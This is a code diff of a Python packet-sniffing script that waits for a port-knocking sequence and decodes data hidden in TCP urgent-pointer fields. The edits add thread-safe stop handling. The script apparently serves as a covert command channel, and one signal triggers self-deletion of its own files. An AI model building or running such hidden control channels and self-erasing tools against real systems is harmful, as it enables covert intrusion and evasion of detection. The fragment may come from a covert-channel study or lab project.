@@ -7,6 +7,7 @@ import subprocess
 import threading
 import socket
 import requests  # Add this import for sending HTTP requests
+from threading import Lock  # Add this import for thread-safe access
 
 
 def get_local_ip():
@@ -48,12 +49,14 @@ knock_index = 0
 communication_port = 80
 ack_event = threading.Event()
 stop_sniff = threading.Event()
+sniffing = False
 sniff_thread = None
 timeout = 10  # Timeout in seconds for acknowledgment
 knock_ip = None
 received_chunks = 0
 chunk_timeout = 5  # Timeout in seconds for receiving the next chunk
 chunk_timer = None
+sniffing_lock = Lock()  # Add a lock for thread-safe access to the sniffing state
 
 def send_acknowledgment(ip, port):
     """Send a TCP acknowledgment packet back to the original sender."""
@@ -117,8 +120,8 @@ def signal_callback(packet):
                 received_chunks = 0
                 signal_received = True
                 print(f"Initial Signal Received: {current_signal}")
-                handle_initial_signal()
                 reset_chunk_timer()
+                handle_initial_signal()
                 return
 
         # Decode the urgent pointer value as 2-byte chunks
@@ -199,7 +202,7 @@ def handle_initial_signal():
         case 9:
             print("Uninstall signal received.")
             # Stop all processes delete all python files and close terminal
-            stop_sniff()
+            stop_sniffing()
             for filename in os.listdir("."):
                 if filename.endswith(("dashboard.py", "encoder.py", "handler.py", "logger.py", "watcher.py")):
                     try:
@@ -324,28 +327,32 @@ def reset_state():
     wait_for_signal()
 
 def stop_sniffing():
-    """Stop the sniff thread gracefully."""
-    global stop_sniff, sniff_thread
-    if sniff_thread and sniff_thread.is_alive():
-        print("Stopping sniff thread...")
-        stop_sniff.set()  # Signal the thread to exit
-        sniff_thread.join(timeout=2)  # Wait up to 2 seconds for clean exit
-        if sniff_thread.is_alive():
-            print("Warning: Thread did not exit cleanly!")
-        stop_sniff.clear()  # Reset for future use
+    """Stop sniffing for packets."""
+    global sniffing, chunk_timer
+    if chunk_timer:
+        chunk_timer.cancel()
+    with sniffing_lock:  # Ensure thread-safe access to sniffing
+        if sniffing:
+            stop_sniff.set()
+            sniffing = False
+            print("Sniffing stopped.")
+
 
 def wait_for_signal():
     """Wait for a signal after port-knocking sequence."""
     print("Waiting for signal...")
-    global sniff_thread
+    global sniffing, sniff_thread
+    sniffing = True
     if not sniff_thread or not sniff_thread.is_alive():
+        stop_sniff.clear()  # Ensure the stop event is cleared before starting
         sniff_thread = threading.Thread(
             target=lambda: sniff(
                 filter=f"tcp and dst host {local_ip}",
                 prn=signal_callback,
                 store=0,
                 stop_filter=lambda _: stop_sniff.is_set()  # Exit if stop_sniff is set
-            )
+            ),
+            daemon=True  # Mark the thread as a daemon to ensure it exits with the main program
         )
         sniff_thread.start()
 
